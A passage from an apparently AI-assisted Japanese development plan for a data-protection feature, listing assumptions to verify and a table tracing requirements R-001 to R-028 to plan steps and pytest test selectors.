  巻き込むため、ディレクトリ単位では追加しない)。Step 13 で sh/ps1 両方に反映する。
- data_patterns.json は識別子そのものを含みうる。`.claude/checkpoints/` が
  gitignore 済みであることは確認済みだが、Generator が別の場所に出力しないこと。
- 未確認の仮定: `uv` が利用可能で `uv run --with pytest python -m pytest` が動く /
  検証: `uv --version` / 期待: バージョン文字列が表示され exit 0。
- 未確認の仮定: `git` が利用可能で history_scan / precommit のテストが一時リポジトリを
  作れる / 検証: `git --version` / 期待: バージョン文字列が表示され exit 0。

## トレーサビリティ

| ID | 対応ステップ | 検証方法 |
|--------|------------|---------|
| R-001 | Step 1, 3 | `uv run --with pytest python -m pytest tests/test_data_protection_phase2.py -q -k lock_update` |
| R-002 | Step 1, 3 | 同 `-k lock_check_detects` |
| R-003 | Step 1, 3 | 同 `-k lock_check_clean` |
| R-004 | Step 1, 8 | 同 `-k doctor_lock_mismatch` |
| R-005 | Step 1, 8 | 同 `-k doctor_backup` |
| R-006 | Step 1, 7 | 同 `-k gate_blocks_upload` |
| R-007 | Step 1, 7 | 同 `-k gate_blocks_pipe` |
| R-008 | Step 1, 7 | 同 `-k gate_allows_exports` |
| R-009 | Step 1, 7 | 同 `-k gate_off` |
| R-010 | Step 1, 7 | 同 `-k gate_fail_open_input` |
| R-011 | Step 1, 4, 5 | 同 `-k dictionary_generate` |
| R-012 | Step 1, 7 | 同 `-k mask_uses_dictionary`(PC-26 は `-k mask_loader_selfcontained`) |
| R-013 | Step 1, 7 | 同 `-k mask_without_dictionary` |
| R-014 | Step 1, 7 | 同 `-k reportgen_sanitize` |
| R-015 | Step 1, 2, 6 | 同 `-k export_check` |
| R-016 | Step 1, 2, 6 | 同 `-k data_scan_diff` |
| R-017 | Step 1, 9 | 同 `-k crossreview_quarantine_doc` |
| R-018 | Step 1, 2, 6 | 同 `-k precommit_detects` |
| R-019 | Step 1, 6 | 同 `-k precommit_clean_fast` |
| R-020 | Step 1, 8 | 同 `-k doctor_precommit_off` |
| R-021 | Step 1, 8 | 同 `-k doctor_parity_p2` |
| R-022 | Step 1, 2, 6 | 同 `-k history_scan` |
| R-023 | Step 1, 10 | 同 `-k standards_synthetic` |
| R-024 | Step 1, 11, 12 | 同 `-k docs_conventions` |
| R-025 | Step 14 | `uv run --with pytest python -m pytest tests/ -q` |
| R-026 | Step 15 | (目視)ユーザーの `!` 実行後、skip していたケースが PASS |
| R-027 | Step 1, 7 | `uv run --with pytest python -m pytest tests/test_data_protection_phase2.py -q -k staging_idempotent` |
| R-028 | Step 1, 8, 13 | 同 `-k scripts_distributed` |

Step 2 はどの R-ID にも直接対応しない(Step 4・6 が共有する検知エンジンの切り出し。
検知ロジックのドリフト防止のための準備)。
